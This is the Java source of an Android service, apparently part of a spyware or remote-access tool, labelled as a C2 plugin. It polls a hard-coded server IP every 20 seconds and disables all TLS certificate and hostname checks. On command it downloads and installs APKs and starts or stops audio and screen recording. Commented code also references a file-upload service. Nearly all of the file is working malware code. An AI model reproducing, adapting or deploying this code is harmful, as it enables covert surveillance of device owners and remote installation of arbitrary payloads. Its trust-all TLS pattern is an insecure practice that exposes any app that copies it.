package test.com.accessibility.base.CC;

import android.app.Service;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.IBinder;
import android.os.RemoteException;
import android.util.Log;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.cert.X509Certificate;
import java.util.TimerTask;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.HttpsURLConnection;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import test.com.accessibility.base.IntentInterface.intentInterface;
import test.com.accessibility.util.network.NetworkHelper;

public class MyCCService extends Service {
    protected Context context;
    private String TAG = "C2-Plugin";

    private static final String ACTION_c2_INSTALL_APK = "com.example.action.ACTION_INSTALL_APK";
    private static final String ACTION_c2_UNINSTALL_APK  = "ACTION_c2_UNINSTALL_APK";

    private static final String ACTION_INSTALL_APK_EXTRA_PARAM1 = "APK_PATH";
    private static final String ACTION_UNINSTALL_APK_EXTRA_PARAM1 = "APK_PACKAGE_NAME";

    public MyCCService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        Log.d(TAG, "[tluo] C2Service Started ... ");
        context = this;
        CCTimerTask();
    }

    public void CCTimerTask(){
        int delay = 5000;
        int period = 20000;
        java.util.Timer timer = new java.util.Timer(true);
        TimerTask task = new TimerTask() {
            public void run() {
                Log.d(TAG, "[tluo] C2TimerTask -- Sending C2 Request ... ");
                sendCCReq(context);
            }
        };
        timer.schedule(task, delay, period);
    }

    public void sendCCReq(Context context){
        String hostIP = "https://118.190.159.86/";
        String cmdServerUri = hostIP + "api/v1.0/cmd";
        String ownId = "00000001";

        URL url = null;
        HttpsURLConnection connection = null;
        BufferedReader br = null;

        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                    new X509TrustManager() {
                        public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                            return null;
                        }

                        public void checkClientTrusted(X509Certificate[] certs, String authType) {
                        }

                        public void checkServerTrusted(X509Certificate[] certs, String authType) {
                        }
                    }
            };
            SSLContext sc = SSLContext.getInstance("SSL");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            url = new URL(cmdServerUri);
            connection = (HttpsURLConnection)url.openConnection();

            connection.setRequestMethod("GET");
            connection.setRequestProperty("USER-AGENT", String.format("Mozilla/5.0-%s", ownId.substring(0, 2)));
            connection.setRequestProperty("ACCEPT-LANGUAGE", String.format("en US-%s", ownId.substring(2, 8)));
            connection.setReadTimeout(10000 /* milliseconds */ );
            connection.setConnectTimeout(15000 /* milliseconds */ );

            String jsonString = null;

            StringBuilder sb = new StringBuilder();
            br = new BufferedReader(new InputStreamReader(connection.getInputStream()));
            String line;
            while ((line = br.readLine()) != null) {
                sb.append(line + "\n");
            }
            br.close();


            jsonString = sb.toString();
            JSONObject obj = new JSONObject(jsonString);
            Log.d(TAG, jsonString);
            String[] cmds = obj.getString("cmd").split(";");
            processCCReq(context, cmds);

        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
    }

    public void processCCReq(Context context, String[] cmds){
        for (String cmd: cmds) {
            if (cmd.contains("install")) {
                String[] args = cmd.split(":");
                String path = args[1];
                String sdPath = context.getExternalFilesDir(null).getAbsolutePath() + File.separator
                        + String.format("%s.apk", path);
                Log.d(TAG, String.format("%s: %s", args[0], sdPath));
                int response = NetworkHelper.DownloadFile(path, sdPath);
                if (response == 0) {
                    NetworkHelper.installInPlugin(context, sdPath);
                }
            } else if (
                    cmd.equals(intentInterface.Remote_CMD_START_RECORDING) ||
                    cmd.equals(intentInterface.Remote_CMD_STOP_RECORDING) ||
                    cmd.equals(intentInterface.Remote_CMD_START_ScreenRECORDING) ||
                    cmd.equals(intentInterface.Remote_CMD_STOP_ScreenRECORDING)
                    ) {
                sendIntentCommand(cmd, context);
            }
        }
    }

    public void sendIntentCommand(String command, Context context){
        Log.d(TAG, "[tluo] sendIntentCommand:" + command);
        Intent intent = new Intent();
        intent.setComponent(new ComponentName(intentInterface.intentServicePkgName, intentInterface.intentServiceName));
        intent.setAction(intentInterface.Remote_CMD_EVENT);
        intent.putExtra(intentInterface.intentService_Param_RootDir, context.getExternalFilesDir(null).getAbsolutePath());
        intent.putExtra(intentInterface.Remote_CMD_EVENT_ACTION_ParamName, command);
        if (command.equals(intentInterface.Remote_CMD_START_RECORDING)){
            intent.putExtra(intentInterface.AccessEvent_intentToken, new Intent());
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            Log.d("tluo","[C2Service] onHandleIntent: " + intent.getAction());
            final String action = intent.getAction();
            if (ACTION_c2_INSTALL_APK.equals(action)) {
                final String param1 = intent.getStringExtra(ACTION_INSTALL_APK_EXTRA_PARAM1);
                handleActionInstallApk(param1);
            } else if (ACTION_c2_UNINSTALL_APK.equals(action)) {
                final String packetname = intent.getStringExtra(ACTION_UNINSTALL_APK_EXTRA_PARAM1);
                Log.d("tluo","[C2Service] onHandleIntent: begin to uninstall " + packetname);
                handleActionUnInstallApk(packetname);
            }
        }
        return Service.START_NOT_STICKY;
    }

    private void handleActionInstallApk(String apk_path) {
        Log.d("tluo", "[C2Service]: Installing APK @ " + apk_path);
        /*try {
            final int re = PluginManager.getInstance().installPackage(apk_path, 0);
            switch (re) {
                case PluginManager.INSTALL_FAILED_NO_REQUESTEDPERMISSION:
                    Log.d("tluo", "安装失败，文件请求的权限太多");
                    break;
                case PackageManagerCompat.INSTALL_FAILED_NOT_SUPPORT_ABI:
                    Log.d("tluo", "宿主不支持插件的abi环境，可能宿主运行时为64位，但插件只支持32位");
                    break;
                case PackageManagerCompat.INSTALL_SUCCEEDED:
                    Log.d("tluo", "[C2Service]: {" + apk_path + "} 安装完成");
                    // TODO: HARDCODE SERVICES IN PLUGINS, THIS INFO SHOULD BE PASSED BY SERVER.
                    startPluginServices();
                    break;
            }
            new File(apk_path).delete();
        } catch (RemoteException e) {
            e.printStackTrace();
        }*/
    }

    private void handleActionUnInstallApk(String packetname) {
        Log.d(TAG, "[tluo]: UnInstalling APK @ " + packetname);
        /*try {
            Intent intent = new Intent();
            intent.setComponent(new ComponentName(plugin_pkg_name, "test.com.accessibility.FileUploadService"));
            intent.setAction("stop");
            startService(intent);
            intent.setComponent(new ComponentName(plugin_pkg_name, "test.com.accessibility.UtilService"));
            stopService(intent);
            PluginManager.getInstance().deletePackage(packetname, 0);
        } catch (RemoteException e) {
            e.printStackTrace();
        }*/
    }
}
